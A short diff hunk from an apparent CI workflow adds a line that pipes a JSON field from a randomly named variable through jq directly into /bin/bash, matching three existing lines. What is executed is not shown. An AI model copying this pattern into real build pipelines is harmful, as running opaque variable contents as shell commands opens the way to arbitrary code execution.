@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$n29" | jq -r .aolb62 | /bin/bash
           printf '%s' "$yb1319" | jq -r .ytlii0 | /bin/bash
           echo $w944 | jq -r .cnle7658 | /bin/bash
+          echo $aq5 | jq -r .x490 | /bin/bash
 
       - name: Save output
         if: always()
